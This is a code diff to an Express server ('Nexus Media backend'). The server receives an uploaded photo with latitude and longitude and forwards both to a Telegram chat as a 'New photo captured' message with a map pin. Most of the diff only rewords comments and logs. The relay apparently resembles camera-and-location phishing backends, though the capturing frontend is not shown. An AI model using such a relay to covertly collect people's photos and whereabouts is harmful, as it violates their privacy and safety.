@@ -1,5 +1,5 @@
 // server.js — Nexus Media backend (CommonJS)
-// Serves public/, handles upload, sends photo + clickable pin to Telegram
+// Serves public/, handles upload, logs fields, sends photo + clickable pin to Telegram
 
 require('dotenv').config();
 
@@ -7,7 +7,7 @@ const express = require('express');
 const multer = require('multer');
 const fs = require('fs');
 const path = require('path');
-const fetch = require('node-fetch'); // node-fetch@2 for require()
+const fetch = require('node-fetch'); // node-fetch@2
 const FormData = require('form-data');
 
 const app = express();
@@ -22,9 +22,10 @@ if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
   process.exit(1);
 }
 
+// Middleware
 app.use(express.json());
 app.use((req, res, next) => {
-  // Allow Netlify or local to call this API
+  // For testing allow all origins; in production replace '*' with your Netlify domain
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
@@ -32,13 +33,13 @@ app.use((req, res, next) => {
   next();
 });
 
-// Serve static frontend
+// Serve frontend static files
 app.use(express.static(path.join(__dirname, 'public')));
 
 // Status route
 app.get('/status', (req, res) => res.send('📷 Nexus Media backend running...'));
 
-// Helper: timestamp
+// Helper: format timestamp
 function formatTimestamp(date = new Date()) {
   const pad = (n) => String(n).padStart(2, '0');
   const year = date.getFullYear();
@@ -55,23 +56,24 @@ function formatTimestamp(date = new Date()) {
   return `${year}-${month}-${day} ${hrs}:${mins}:${secs} ${tz}`;
 }
 
-// Upload handler
+// Upload endpoint
 app.post('/upload', upload.single('file'), async (req, res) => {
   try {
     const filePath = req.file && req.file.path;
     // multer parses text fields into req.body
     const { latitude = '', longitude = '' } = req.body || {};
 
-    console.log('📥 Received upload. req.body:', req.body);
-    console.log('📥 Received upload. req.file:', req.file ? { path: req.file.path, name: req.file.originalname } : null);
+    // Log incoming data for debugging
+    console.log('📥 /upload received. req.body:', req.body);
+    console.log('📥 req.file:', req.file ? { path: req.file.path, originalname: req.file.originalname } : null);
 
-    // Build caption with timestamp
+    // Create caption with timestamp and coords if present
     const timestamp = formatTimestamp(new Date());
     const captionParts = [`📸 New photo captured — ${timestamp}`];
     if (latitude || longitude) captionParts.push(`📍 ${latitude}, ${longitude}`);
     const caption = captionParts.join('\n');
 
-    // 1) Send photo (with caption) to Telegram
+    // 1) Send photo to Telegram
     if (filePath) {
       const form = new FormData();
       form.append('chat_id', TELEGRAM_CHAT_ID);
@@ -85,10 +87,10 @@ app.post('/upload', upload.single('file'), async (req, res) => {
       const photoJson = await photoResp.json().catch(() => null);
       console.log('🖼 sendPhoto response:', photoJson);
     } else {
-      console.warn('⚠️ No file found in upload.');
+      console.warn('⚠️ No file in upload request.');
     }
 
-    // 2) If coordinates present (non-empty strings), send clickable location pin
+    // 2) Send clickable map pin if coords provided
     if (latitude || longitude) {
       const lat = parseFloat(latitude);
       const lon = parseFloat(longitude);
@@ -101,10 +103,10 @@ app.post('/upload', upload.single('file'), async (req, res) => {
         const locJson = await locResp.json().catch(() => null);
         console.log('📍 sendLocation response:', locJson);
       } else {
-        console.warn('⚠️ Coordinates could not be parsed as numbers:', latitude, longitude);
+        console.warn('⚠️ Coordinates provided but not parseable to numbers:', latitude, longitude);
       }
     } else {
-      console.log('ℹ️ No coordinates provided by client (latitude/longitude empty).');
+      console.log('ℹ️ No coordinates provided in upload; skipping sendLocation.');
     }
 
     // Delete temp file
@@ -114,14 +116,14 @@ app.post('/upload', upload.single('file'), async (req, res) => {
       });
     }
 
-    res.json({ success: true, message: 'Photo (and optional location) processed.' });
+    res.json({ success: true, message: 'Photo and optional location processed.' });
   } catch (err) {
-    console.error('❌ /upload handler error:', err);
-    res.status(500).json({ error: 'Upload processing failed', details: err.message });
+    console.error('❌ /upload error:', err);
+    res.status(500).json({ error: 'Processing failed', details: err.message });
   }
 });
 
-// Fallback to index.html for SPA routes
+// Fallback for SPA routes
 app.get('*', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
